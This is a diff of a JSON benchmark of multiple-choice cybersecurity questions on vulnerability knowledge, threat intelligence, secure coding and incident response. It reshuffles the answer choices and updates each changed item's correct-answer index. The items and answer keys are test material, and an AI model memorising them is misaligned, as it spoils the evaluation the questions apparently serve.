@@ -4,12 +4,12 @@
     "dimension": "VK",
     "question": "What type of vulnerability allows an attacker to inject SQL commands through user input?",
     "choices": [
+      "SSRF",
       "SQL Injection",
       "XSS",
-      "CSRF",
-      "SSRF"
+      "CSRF"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -17,12 +17,12 @@
     "dimension": "VK",
     "question": "Which CWE category covers buffer overflow vulnerabilities?",
     "choices": [
+      "CWE-352",
       "CWE-120",
-      "CWE-79",
       "CWE-89",
-      "CWE-352"
+      "CWE-79"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -30,12 +30,12 @@
     "dimension": "VK",
     "question": "What is the CVSS v3.1 base score range?",
     "choices": [
+      "A-F",
       "0.0-10.0",
-      "0-100",
       "1-5",
-      "A-F"
+      "0-100"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -43,12 +43,12 @@
     "dimension": "VK",
     "question": "Which vulnerability allows execution of arbitrary code through deserialization?",
     "choices": [
-      "Insecure Deserialization",
-      "SQL Injection",
+      "LDAP Injection",
       "XSS",
-      "LDAP Injection"
+      "Insecure Deserialization",
+      "SQL Injection"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -56,12 +56,12 @@
     "dimension": "VK",
     "question": "What does TOCTOU stand for in vulnerability analysis?",
     "choices": [
-      "Time of Check to Time of Use",
+      "Test of Coverage to Test of Usage",
       "Type of Code to Type of Use",
-      "Transfer of Control to Time of Update",
-      "Test of Coverage to Test of Usage"
+      "Time of Check to Time of Use",
+      "Transfer of Control to Time of Update"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -69,12 +69,12 @@
     "dimension": "VK",
     "question": "Which attack exploits the XML parser to access local files?",
     "choices": [
+      "XPath Injection",
       "XXE",
-      "XSS",
       "XSRF",
-      "XPath Injection"
+      "XSS"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -82,12 +82,12 @@
     "dimension": "VK",
     "question": "What is a use-after-free vulnerability?",
     "choices": [
-      "Accessing memory after deallocation",
       "Using freed disk space",
-      "Accessing expired sessions",
-      "Using revoked certificates"
+      "Using revoked certificates",
+      "Accessing memory after deallocation",
+      "Accessing expired sessions"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -96,9 +96,9 @@
     "question": "Which tool is commonly used for static analysis of C/C++ code?",
     "choices": [
       "Coverity",
+      "Metasploit",
       "Burp Suite",
-      "Wireshark",
-      "Metasploit"
+      "Wireshark"
     ],
     "correct": 0,
     "difficulty": 2
@@ -109,9 +109,9 @@
     "question": "What is heap spraying used for?",
     "choices": [
       "Exploiting memory corruption",
-      "Cleaning memory leaks",
       "Distributing workload",
-      "Network flooding"
+      "Network flooding",
+      "Cleaning memory leaks"
     ],
     "correct": 0,
     "difficulty": 4
@@ -122,9 +122,9 @@
     "question": "What does ASLR protect against?",
     "choices": [
       "Memory corruption exploits",
-      "SQL injection",
       "XSS attacks",
-      "Phishing"
+      "Phishing",
+      "SQL injection"
     ],
     "correct": 0,
     "difficulty": 2
@@ -135,9 +135,9 @@
     "question": "Which CWE is for path traversal?",
     "choices": [
       "CWE-22",
+      "CWE-352",
       "CWE-79",
-      "CWE-89",
-      "CWE-352"
+      "CWE-89"
     ],
     "correct": 0,
     "difficulty": 2
@@ -147,12 +147,12 @@
     "dimension": "VK",
     "question": "What is a race condition vulnerability?",
     "choices": [
-      "Timing-dependent behavior flaw",
-      "Performance bottleneck",
+      "CPU scheduling error",
       "Network latency issue",
-      "CPU scheduling error"
+      "Performance bottleneck",
+      "Timing-dependent behavior flaw"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -160,12 +160,12 @@
     "dimension": "VK",
     "question": "ROP chains are used to bypass which protection?",
     "choices": [
-      "DEP/NX bit",
       "ASLR",
+      "DEP/NX bit",
       "Stack canaries",
       "Firewall rules"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 4
   },
   {
@@ -186,12 +186,12 @@
     "dimension": "VK",
     "question": "Which is NOT a memory safety vulnerability?",
     "choices": [
-      "CSRF",
-      "Buffer overflow",
       "Use-after-free",
-      "Double free"
+      "CSRF",
+      "Double free",
+      "Buffer overflow"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -200,9 +200,9 @@
     "question": "What does fuzzing help discover?",
     "choices": [
       "Input handling bugs",
-      "Logic errors",
+      "Social engineering vectors",
       "Design flaws",
-      "Social engineering vectors"
+      "Logic errors"
     ],
     "correct": 0,
     "difficulty": 2
@@ -213,9 +213,9 @@
     "question": "Symbolic execution is used for?",
     "choices": [
       "Path exploration in programs",
+      "Font rendering",
       "Encrypting symbols",
-      "Symbol table management",
-      "Font rendering"
+      "Symbol table management"
     ],
     "correct": 0,
     "difficulty": 3
@@ -227,8 +227,8 @@
     "choices": [
       "Arithmetic exceeding type bounds",
       "Too many integers in array",
-      "Stack overflow with integers",
-      "Integer precision loss"
+      "Integer precision loss",
+      "Stack overflow with integers"
     ],
     "correct": 0,
     "difficulty": 2
@@ -238,12 +238,12 @@
     "dimension": "VK",
     "question": "Format string vulnerabilities affect which function family?",
     "choices": [
-      "printf",
-      "malloc",
       "socket",
+      "malloc",
+      "printf",
       "fork"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -251,12 +251,12 @@
     "dimension": "VK",
     "question": "What is a dangling pointer?",
     "choices": [
+      "Pointer arithmetic error",
       "Pointer to freed memory",
-      "Null pointer",
       "Wild pointer from uninitialized var",
-      "Pointer arithmetic error"
+      "Null pointer"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -265,9 +265,9 @@
     "question": "JIT spraying targets which component?",
     "choices": [
       "JavaScript JIT compiler",
-      "Java Runtime",
+      "JWT validator",
       "JSON parser",
-      "JWT validator"
+      "Java Runtime"
     ],
     "correct": 0,
     "difficulty": 5
@@ -277,12 +277,12 @@
     "dimension": "VK",
     "question": "Which vulnerability class does Spectre belong to?",
     "choices": [
-      "Side-channel",
-      "Memory corruption",
       "Injection",
-      "Authentication bypass"
+      "Authentication bypass",
+      "Side-channel",
+      "Memory corruption"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 4
   },
   {
@@ -290,12 +290,12 @@
     "dimension": "VK",
     "question": "What is the purpose of a CVE identifier?",
     "choices": [
+      "Track exploit code",
       "Uniquely identify vulnerabilities",
       "Rate vulnerability severity",
-      "Track exploit code",
       "Classify attack types"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -303,12 +303,12 @@
     "dimension": "VK",
     "question": "What is SAST?",
     "choices": [
-      "Static Application Security Testing",
       "Secure API Service Testing",
       "System Admin Security Toolkit",
+      "Static Application Security Testing",
       "Structured Attack Simulation Tool"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -317,9 +317,9 @@
     "question": "NULL pointer dereference leads to?",
     "choices": [
       "Crash/denial of service",
-      "Remote code execution always",
       "Data exfiltration",
-      "Privilege escalation always"
+      "Privilege escalation always",
+      "Remote code execution always"
     ],
     "correct": 0,
     "difficulty": 2
@@ -329,12 +329,12 @@
     "dimension": "VK",
     "question": "Which describes a zero-day vulnerability?",
     "choices": [
-      "Unknown to vendor, no patch",
+      "Vulnerability found day zero of deployment",
       "CVSS score of zero",
-      "Zero impact vulnerability",
-      "Vulnerability found day zero of deployment"
+      "Unknown to vendor, no patch",
+      "Zero impact vulnerability"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -342,12 +342,12 @@
     "dimension": "VK",
     "question": "What is prototype pollution in JavaScript?",
     "choices": [
+      "DOM manipulation attack",
       "Modifying Object.prototype",
       "Memory leak in prototypes",
-      "Polluting global namespace",
-      "DOM manipulation attack"
+      "Polluting global namespace"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -355,12 +355,12 @@
     "dimension": "VK",
     "question": "SSRF stands for?",
     "choices": [
-      "Server-Side Request Forgery",
       "Secure Socket Request Format",
-      "Session State Request Failure",
-      "Server Security Response Filter"
+      "Server-Side Request Forgery",
+      "Server Security Response Filter",
+      "Session State Request Failure"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -369,9 +369,9 @@
     "question": "What is a gadget chain in deserialization attacks?",
     "choices": [
       "Sequence of method calls leading to RCE",
-      "Series of USB devices",
+      "Linked list of objects",
       "Chain of network requests",
-      "Linked list of objects"
+      "Series of USB devices"
     ],
     "correct": 0,
     "difficulty": 4
@@ -381,12 +381,12 @@
     "dimension": "VK",
     "question": "Which metric is NOT part of CVSS base score?",
     "choices": [
+      "Scope",
       "Temporal score",
-      "Attack vector",
       "User interaction",
-      "Scope"
+      "Attack vector"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -394,12 +394,12 @@
     "dimension": "TI",
     "question": "What is a TTPs in threat intelligence?",
     "choices": [
-      "Tactics, Techniques, and Procedures",
-      "Threats, Targets, and Patterns",
+      "Tracking, Tracing, and Profiling",
       "Tools, Technologies, and Protocols",
-      "Tracking, Tracing, and Profiling"
+      "Threats, Targets, and Patterns",
+      "Tactics, Techniques, and Procedures"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -407,12 +407,12 @@
     "dimension": "TI",
     "question": "STIX is a standard for?",
     "choices": [
-      "Sharing threat intelligence",
-      "Security testing",
       "System administration",
-      "Source code analysis"
+      "Sharing threat intelligence",
+      "Source code analysis",
+      "Security testing"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -420,12 +420,12 @@
     "dimension": "TI",
     "question": "What does MITRE ATT&CK provide?",
     "choices": [
+      "Firewall rules",
       "Adversary behavior knowledge base",
-      "Vulnerability database",
       "Malware samples",
-      "Firewall rules"
+      "Vulnerability database"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -433,12 +433,12 @@
     "dimension": "TI",
     "question": "What is an IOC?",
     "choices": [
-      "Indicator of Compromise",
-      "Instance of Control",
+      "Integrity of Configuration",
       "Input Output Channel",
-      "Integrity of Configuration"
+      "Indicator of Compromise",
+      "Instance of Control"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 1
   },
   {
@@ -446,12 +446,12 @@
     "dimension": "TI",
     "question": "Which APT group is attributed to Russia's GRU?",
     "choices": [
-      "APT28/Fancy Bear",
       "APT1/Comment Crew",
+      "APT28/Fancy Bear",
       "Lazarus Group",
       "APT41/Winnti"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -459,12 +459,12 @@
     "dimension": "TI",
     "question": "What is a diamond model in threat intel?",
     "choices": [
+      "Risk assessment matrix",
       "Adversary-capability-infrastructure-victim model",
       "Four-layer defense model",
-      "Risk assessment matrix",
       "Encryption standard"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -472,12 +472,12 @@
     "dimension": "TI",
     "question": "TAXII is used for?",
     "choices": [
-      "Transporting threat intelligence",
-      "Testing applications",
       "Tracking assets",
-      "Training AI models"
+      "Testing applications",
+      "Training AI models",
+      "Transporting threat intelligence"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -485,12 +485,12 @@
     "dimension": "TI",
     "question": "What is threat hunting?",
     "choices": [
-      "Proactive search for threats",
-      "Bug bounty program",
+      "Vulnerability scanning",
       "Penetration testing",
-      "Vulnerability scanning"
+      "Bug bounty program",
+      "Proactive search for threats"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -498,12 +498,12 @@
     "dimension": "TI",
     "question": "Kill chain model has how many phases?",
     "choices": [
-      "7",
       "5",
-      "10",
-      "3"
+      "7",
+      "3",
+      "10"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -524,12 +524,12 @@
     "dimension": "TI",
     "question": "What is a watering hole attack?",
     "choices": [
-      "Compromising sites victims visit",
-      "Flooding network with traffic",
       "DNS poisoning",
-      "Email phishing campaign"
+      "Flooding network with traffic",
+      "Email phishing campaign",
+      "Compromising sites victims visit"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -537,12 +537,12 @@
     "dimension": "TI",
     "question": "YARA rules are used for?",
     "choices": [
-      "Malware pattern matching",
+      "Log parsing",
       "Network filtering",
-      "Access control",
-      "Log parsing"
+      "Malware pattern matching",
+      "Access control"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -550,12 +550,12 @@
     "dimension": "TI",
     "question": "What is living-off-the-land (LOtL)?",
     "choices": [
-      "Using legitimate tools maliciously",
       "Surviving without internet",
       "Air-gapped operations",
+      "Using legitimate tools maliciously",
       "Using open-source tools"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -563,12 +563,12 @@
     "dimension": "TI",
     "question": "What does TLP:RED mean?",
     "choices": [
-      "Not for disclosure, restricted",
+      "Critical vulnerability",
       "High priority alert",
-      "Active exploitation",
-      "Critical vulnerability"
+      "Not for disclosure, restricted",
+      "Active exploitation"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -576,12 +576,12 @@
     "dimension": "TI",
     "question": "Sigma rules detect what?",
     "choices": [
+      "Memory corruption",
       "Suspicious log patterns",
-      "Network anomalies",
       "File signatures",
-      "Memory corruption"
+      "Network anomalies"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -589,12 +589,12 @@
     "dimension": "TI",
     "question": "What is OSINT in threat intelligence?",
     "choices": [
+      "Organized Security Information Tracking",
       "Open Source Intelligence",
       "Operating System Integration",
-      "Online Security Investigation Network",
-      "Organized Security Information Tracking"
+      "Online Security Investigation Network"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -602,12 +602,12 @@
     "dimension": "TI",
     "question": "Cobalt Strike is primarily?",
     "choices": [
+      "Firewall",
       "Adversary simulation tool",
       "Vulnerability scanner",
-      "SIEM platform",
-      "Firewall"
+      "SIEM platform"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -615,12 +615,12 @@
     "dimension": "TI",
     "question": "What is a C2 framework?",
     "choices": [
-      "Command and Control infrastructure",
+      "Change control system",
       "Code review tool",
-      "Compliance checker",
-      "Change control system"
+      "Command and Control infrastructure",
+      "Compliance checker"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -628,12 +628,12 @@
     "dimension": "TI",
     "question": "Attribution in cyber threat intel means?",
     "choices": [
-      "Identifying responsible actor",
-      "Assigning CVE numbers",
       "Categorizing malware types",
+      "Assigning CVE numbers",
+      "Identifying responsible actor",
       "Measuring impact"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -641,12 +641,12 @@
     "dimension": "TI",
     "question": "What is a false flag operation in cyber?",
     "choices": [
-      "Making attack appear from different source",
-      "Legitimate penetration test",
       "Failed phishing attempt",
+      "Legitimate penetration test",
+      "Making attack appear from different source",
       "Firewall misconfiguration"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -654,12 +654,12 @@
     "dimension": "TI",
     "question": "Threat intelligence platforms typically integrate with?",
     "choices": [
+      "IDEs",
       "SIEM",
       "Compilers",
-      "IDEs",
       "Version control"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -667,12 +667,12 @@
     "dimension": "TI",
     "question": "What are TTPs in the context of the Pyramid of Pain?",
     "choices": [
-      "Hardest for adversaries to change",
       "Easiest to detect",
       "Most common indicator",
-      "Least useful intelligence"
+      "Least useful intelligence",
+      "Hardest for adversaries to change"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -680,12 +680,12 @@
     "dimension": "TI",
     "question": "Supply chain attacks target?",
     "choices": [
-      "Trusted software/hardware providers",
+      "Cloud storage",
       "Physical supply warehouses",
-      "Network bandwidth",
-      "Cloud storage"
+      "Trusted software/hardware providers",
+      "Network bandwidth"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -706,12 +706,12 @@
     "dimension": "TI",
     "question": "MISP is?",
     "choices": [
-      "Threat intelligence sharing platform",
+      "Mobile security platform",
       "Malware isolation protocol",
-      "Memory inspection tool",
-      "Mobile security platform"
+      "Threat intelligence sharing platform",
+      "Memory inspection tool"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -719,12 +719,12 @@
     "dimension": "TI",
     "question": "What characterizes a fileless malware attack?",
     "choices": [
-      "Operates entirely in memory",
       "Has no payload",
       "Targets only files",
+      "Operates entirely in memory",
       "Cannot be detected"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -732,12 +732,12 @@
     "dimension": "TI",
     "question": "What is strategic threat intelligence?",
     "choices": [
-      "High-level trends for executives",
-      "Technical IOCs",
       "Tactical defensive measures",
-      "Operational playbooks"
+      "Technical IOCs",
+      "Operational playbooks",
+      "High-level trends for executives"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -745,12 +745,12 @@
     "dimension": "TI",
     "question": "Sandboxing in threat analysis is used for?",
     "choices": [
-      "Safe malware execution and observation",
-      "Isolating user sessions",
       "Testing patches",
-      "Network segmentation"
+      "Network segmentation",
+      "Safe malware execution and observation",
+      "Isolating user sessions"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -760,8 +760,8 @@
     "choices": [
       "Stream of IOCs and threat data",
       "RSS feed about security news",
-      "Network traffic capture",
-      "Audit log stream"
+      "Audit log stream",
+      "Network traffic capture"
     ],
     "correct": 0,
     "difficulty": 2
@@ -771,12 +771,12 @@
     "dimension": "TI",
     "question": "What does OPSEC mean for threat actors?",
     "choices": [
-      "Operational security practices",
+      "Optical signal encryption",
       "Open source protocols",
-      "Operating system configuration",
-      "Optical signal encryption"
+      "Operational security practices",
+      "Operating system configuration"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -784,12 +784,12 @@
     "dimension": "SC",
     "question": "Which function prevents SQL injection in Python?",
     "choices": [
-      "Parameterized queries",
-      "String concatenation",
       "eval()",
-      "exec()"
+      "exec()",
+      "Parameterized queries",
+      "String concatenation"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 1
   },
   {
@@ -798,8 +798,8 @@
     "question": "What is input validation?",
     "choices": [
       "Checking user input against expected format",
-      "Validating database schema",
       "Testing network connectivity",
+      "Validating database schema",
       "Verifying certificates"
     ],
     "correct": 0,
@@ -810,12 +810,12 @@
     "dimension": "SC",
     "question": "Content Security Policy (CSP) mitigates?",
     "choices": [
-      "XSS attacks",
-      "SQL injection",
+      "CSRF",
       "Buffer overflow",
-      "CSRF"
+      "SQL injection",
+      "XSS attacks"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -823,12 +823,12 @@
     "dimension": "SC",
     "question": "What is output encoding?",
     "choices": [
-      "Escaping special characters before rendering",
-      "Compressing output data",
       "Encrypting responses",
-      "Formatting log output"
+      "Formatting log output",
+      "Escaping special characters before rendering",
+      "Compressing output data"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -836,12 +836,12 @@
     "dimension": "SC",
     "question": "CSRF tokens prevent?",
     "choices": [
+      "Buffer overflow",
       "Cross-site request forgery",
-      "SQL injection",
       "XSS",
-      "Buffer overflow"
+      "SQL injection"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -849,12 +849,12 @@
     "dimension": "SC",
     "question": "What is the principle of least privilege?",
     "choices": [
-      "Minimal necessary access rights",
       "Everyone gets admin access",
       "Use the simplest code possible",
-      "Minimize code complexity"
+      "Minimize code complexity",
+      "Minimal necessary access rights"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -862,12 +862,12 @@
     "dimension": "SC",
     "question": "Prepared statements protect against?",
     "choices": [
-      "SQL injection",
-      "XSS",
+      "Clickjacking",
       "CSRF",
-      "Clickjacking"
+      "XSS",
+      "SQL injection"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -875,12 +875,12 @@
     "dimension": "SC",
     "question": "What does HTTPS ensure?",
     "choices": [
-      "Encrypted transport",
-      "Virus-free content",
+      "XSS protection",
       "SQL injection prevention",
-      "XSS protection"
+      "Virus-free content",
+      "Encrypted transport"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -888,12 +888,12 @@
     "dimension": "SC",
     "question": "Safe deserialization requires?",
     "choices": [
-      "Type allowlisting",
-      "Using eval()",
+      "Global exception handling",
       "Disabling validation",
-      "Global exception handling"
+      "Type allowlisting",
+      "Using eval()"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -902,9 +902,9 @@
     "question": "What is a secure coding standard?",
     "choices": [
       "Guidelines for writing secure code",
-      "Encryption algorithm spec",
+      "Hardware security module",
       "Network protocol definition",
-      "Hardware security module"
+      "Encryption algorithm spec"
     ],
     "correct": 0,
     "difficulty": 1
@@ -915,9 +915,9 @@
     "question": "Memory-safe languages include?",
     "choices": [
       "Rust, Go, Java",
-      "C, C++, Assembly",
+      "Assembly, Fortran, COBOL",
       "C, Rust, Go",
-      "Assembly, Fortran, COBOL"
+      "C, C++, Assembly"
     ],
     "correct": 0,
     "difficulty": 2
@@ -927,12 +927,12 @@
     "dimension": "SC",
     "question": "Constant-time comparison prevents?",
     "choices": [
-      "Timing side-channel attacks",
       "Buffer overflow",
+      "Race conditions",
       "SQL injection",
-      "Race conditions"
+      "Timing side-channel attacks"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -940,12 +940,12 @@
     "dimension": "SC",
     "question": "What is taint analysis?",
     "choices": [
-      "Tracking untrusted data flow",
       "Code smell detection",
+      "Memory leak detection",
       "Performance profiling",
-      "Memory leak detection"
+      "Tracking untrusted data flow"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -955,8 +955,8 @@
     "choices": [
       "CSRF",
       "XSS",
-      "SQL injection",
-      "Clickjacking"
+      "Clickjacking",
+      "SQL injection"
     ],
     "correct": 0,
     "difficulty": 2
@@ -966,12 +966,12 @@
     "dimension": "SC",
     "question": "Secure random number generation uses?",
     "choices": [
-      "CSPRNG",
+      "time-based seeds",
       "Math.random()",
-      "rand()",
-      "time-based seeds"
+      "CSPRNG",
+      "rand()"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -979,12 +979,12 @@
     "dimension": "SC",
     "question": "What is defense in depth?",
     "choices": [
-      "Multiple layers of security controls",
+      "Depth-first search for vulns",
       "Deep packet inspection only",
-      "Using strongest single defense",
-      "Depth-first search for vulns"
+      "Multiple layers of security controls",
+      "Using strongest single defense"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -992,12 +992,12 @@
     "dimension": "SC",
     "question": "Which header prevents clickjacking?",
     "choices": [
-      "X-Frame-Options",
       "X-XSS-Protection",
       "X-Content-Type-Options",
-      "X-Powered-By"
+      "X-Powered-By",
+      "X-Frame-Options"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1005,12 +1005,12 @@
     "dimension": "SC",
     "question": "What is the OWASP Top 10?",
     "choices": [
-      "Most critical web app security risks",
-      "Top 10 programming languages",
       "Best security tools",
-      "Fastest encryption algorithms"
+      "Top 10 programming languages",
+      "Fastest encryption algorithms",
+      "Most critical web app security risks"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 1
   },
   {
@@ -1018,12 +1018,12 @@
     "dimension": "SC",
     "question": "Secrets management best practice?",
     "choices": [
-      "Use vault, never hardcode",
-      "Store in source code",
+      "Embed in docker images",
       "Use environment variables only",
-      "Embed in docker images"
+      "Store in source code",
+      "Use vault, never hardcode"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1032,9 +1032,9 @@
     "question": "What is sandboxing in secure coding?",
     "choices": [
       "Isolating code execution environment",
-      "Testing in production",
+      "Code obfuscation",
       "Using sandbox databases",
-      "Code obfuscation"
+      "Testing in production"
     ],
     "correct": 0,
     "difficulty": 2
@@ -1044,12 +1044,12 @@
     "dimension": "SC",
     "question": "Which prevents path traversal?",
     "choices": [
-      "Canonicalize then validate path",
       "URL encoding",
       "Base64 encoding",
-      "HTTPS"
+      "HTTPS",
+      "Canonicalize then validate path"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -1058,9 +1058,9 @@
     "question": "What is a security code review?",
     "choices": [
       "Manual analysis of source code for flaws",
+      "Performance review",
       "Automated testing",
-      "Penetration testing",
-      "Performance review"
+      "Penetration testing"
     ],
     "correct": 0,
     "difficulty": 1
@@ -1071,8 +1071,8 @@
     "question": "Proper error handling should?",
     "choices": [
       "Log details internally, show generic message",
-      "Show full stack trace to user",
       "Suppress all errors",
+      "Show full stack trace to user",
       "Email errors to admin"
     ],
     "correct": 0,
@@ -1083,12 +1083,12 @@
     "dimension": "SC",
     "question": "What is secure session management?",
     "choices": [
-      "Proper token generation, expiry, invalidation",
-      "Using sequential session IDs",
       "Never expiring sessions",
-      "Storing sessions in URLs"
+      "Storing sessions in URLs",
+      "Proper token generation, expiry, invalidation",
+      "Using sequential session IDs"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1096,12 +1096,12 @@
     "dimension": "SC",
     "question": "API rate limiting prevents?",
     "choices": [
-      "Brute force and DoS",
       "SQL injection",
-      "XSS",
-      "CSRF"
+      "CSRF",
+      "Brute force and DoS",
+      "XSS"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1110,9 +1110,9 @@
     "question": "What is dependency scanning?",
     "choices": [
       "Checking libraries for known vulns",
+      "Monitoring runtime deps",
       "Analyzing code dependencies graph",
-      "Testing import statements",
-      "Monitoring runtime deps"
+      "Testing import statements"
     ],
     "correct": 0,
     "difficulty": 2
@@ -1122,12 +1122,12 @@
     "dimension": "SC",
     "question": "Which prevents insecure direct object references?",
     "choices": [
-      "Authorization checks on every access",
-      "Input validation only",
       "HTTPS",
-      "Rate limiting"
+      "Rate limiting",
+      "Authorization checks on every access",
+      "Input validation only"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1135,12 +1135,12 @@
     "dimension": "SC",
     "question": "What is threat modeling in SDLC?",
     "choices": [
-      "Identifying threats during design",
-      "Testing after deployment",
       "Code review only",
+      "Testing after deployment",
+      "Identifying threats during design",
       "Compliance audit"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1148,12 +1148,12 @@
     "dimension": "SC",
     "question": "What is the STRIDE threat model?",
     "choices": [
+      "Six-layer network model",
       "Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation",
       "Six security testing phases",
-      "Six-layer network model",
       "Security tool rating system"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -1175,9 +1175,9 @@
     "question": "First step in incident response?",
     "choices": [
       "Identification/Detection",
-      "Containment",
       "Eradication",
-      "Recovery"
+      "Recovery",
+      "Containment"
     ],
     "correct": 0,
     "difficulty": 1
@@ -1187,12 +1187,12 @@
     "dimension": "IR",
     "question": "What is the NIST IR lifecycle?",
     "choices": [
-      "Preparation, Detection, Containment, Post-Incident",
-      "Plan, Do, Check, Act",
+      "Assess, Mitigate, Monitor, Report",
       "Identify, Protect, Detect, Respond, Recover",
-      "Assess, Mitigate, Monitor, Report"
+      "Preparation, Detection, Containment, Post-Incident",
+      "Plan, Do, Check, Act"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -1200,12 +1200,12 @@
     "dimension": "IR",
     "question": "Chain of custody in IR means?",
     "choices": [
-      "Documenting evidence handling",
       "Attack kill chain",
+      "Documenting evidence handling",
       "Network topology map",
       "Escalation hierarchy"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1213,12 +1213,12 @@
     "dimension": "IR",
     "question": "What is a SIEM?",
     "choices": [
-      "Security Information and Event Management",
-      "Secure Internet Email Manager",
+      "Security Incident Escalation Module",
       "System Integration Event Monitor",
-      "Security Incident Escalation Module"
+      "Security Information and Event Management",
+      "Secure Internet Email Manager"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 1
   },
   {
@@ -1226,12 +1226,12 @@
     "dimension": "IR",
     "question": "Volatility framework analyzes?",
     "choices": [
-      "Memory dumps",
-      "Network traffic",
       "Disk images",
-      "Log files"
+      "Memory dumps",
+      "Log files",
+      "Network traffic"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -1239,12 +1239,12 @@
     "dimension": "IR",
     "question": "What is containment in IR?",
     "choices": [
-      "Limiting attack spread",
       "Deleting malware",
+      "Limiting attack spread",
       "Restoring backups",
       "Notifying management"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -1253,9 +1253,9 @@
